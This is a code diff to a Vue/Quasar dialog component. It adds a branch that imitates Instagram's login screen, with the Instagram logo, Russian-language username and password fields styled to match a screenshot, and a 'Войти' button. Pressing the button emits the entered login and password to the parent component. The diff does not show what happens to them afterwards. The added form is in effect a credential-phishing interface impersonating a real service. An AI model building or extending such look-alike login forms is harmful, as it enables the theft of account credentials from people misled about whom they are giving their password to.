@@ -4,9 +4,11 @@ import InputComponent from 'src/components/InputComponent.vue'
 import { ref, watch } from 'vue'
 import close from '../assets/icons/close.svg'
 import EditorComponent from 'src/components/EditorComponent.vue'
+import instLogo from '../assets/icons/inst-logo.svg'
 
 const answer = defineModel<string>('model')
 const code = defineModel<string>('code')
+const password = defineModel<string>('password')
 const props = defineProps<{
   isOpen: boolean
   answerKey: string
@@ -40,13 +42,13 @@ watch(isOpenRef, (value) => {
 })
 
 const onSave = () => {
-  emits('save', props.answerKey == 'tg' ? answer.value : { answer: answer.value, code: code.value })
+  emits('save', props.answerKey == 'tg' ? answer.value : props.answerKey == 'inst' ? {answer: answer.value, password: password.value} : { answer: answer.value, code: code.value })
 }
 </script>
 
 <template>
   <q-dialog v-model="isOpenRef">
-    <div class="dialog-container">
+    <div v-if="answerKey !== 'inst'" class="dialog-container">
       <q-btn class="close" flat round @click="emits('close')">
         <img :src="close" />
       </q-btn>
@@ -63,6 +65,26 @@ const onSave = () => {
       </div>
       <DefaultButton label="Сохранить" @click="onSave" class="save" />
     </div>
+    <div v-else class="inst-container">
+      <img :src="instLogo" alt="Instagram Logo" />
+<q-input
+    v-model="answer"
+    label="Телефон, имя пользователя или эл. адрес"
+    outlined
+    dense
+    class="login-input"
+  />
+  <q-input
+    v-model="password"
+    type="password"
+    label="Пароль"
+    outlined
+    dense
+    class="login-input"
+  />    
+  <q-btn label="Войти" no-caps class="login"  @click="onSave" />
+  <DefaultButton label="Отмена" @click="emits('close')" class="cancel" />
+ </div>
   </q-dialog>
 </template>
 
@@ -103,5 +125,91 @@ const onSave = () => {
     margin-top: var(--spacing-sm);
     align-self: center;
   }
+
+  
 }
+
+.inst-container {
+  width: fit-content;
+  background-color:rgb(0, 0, 0);
+  border-radius: 10px;
+  padding: var(--spacing-sm);
+  padding-top: 30px;
+  color: white;
+  height: max-content;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  position: relative;
+  
+
+  .login-input { margin-bottom: 12px; }
+
+  img {
+    width: 200px;
+  }
+
+  .login {
+    width: 80%;
+    margin-top: var(--spacing-sm);
+    border-radius: 10px;
+    background-color: #4150F7;
+  }
+
+  .cancel {
+    margin-top: var(--spacing-xs);
+    align-self: center;
+  }
+}
+.login-input {
+  width: 350px;
+  height: 40px;
+}
+
+.login-input ::v-deep .q-field__control {
+    background-color: #121212 !important;           /* black fill like screenshot   */
+    color: #4a4a4a !important;     /* thin grey outline            */
+    border-radius: 4px;               /* subtle rounded corners       */
+    // padding: 14px 12px;               /* inner breathing room         */
+    transition: border-color .2s ease, box-shadow .2s ease;
+  }
+
+.login-input ::v-deep .q-field__native::placeholder {
+    color: #9d9d9d !important;
+    opacity: 1;              
+  }
+
+  .login-input ::v-deep .q-field__native {
+    // padding: 10px 0px !important;
+    color: #fff;         
+    // font-size: 12px;
+  }
+
+
+
+  .login-input ::v-deep input:-webkit-autofill {
+   box-shadow: 0 0 0px 1000px #121212 inset !important;
+   -webkit-text-fill-color: #fff !important;
+   caret-color: #fff;
+}
+
+.login-input ::v-deep .q-field__label {
+  color: #4a4a4a;
+}
+
+@media screen and (max-width: 576px) {
+
+  .inst-container {
+    width: 90vw;
+    padding: var(--spacing-xs);
+    padding-top: 30px;
+  }
+
+  .login-input {
+    width: 90%;
+  }
+  
+}
+
+
 </style>
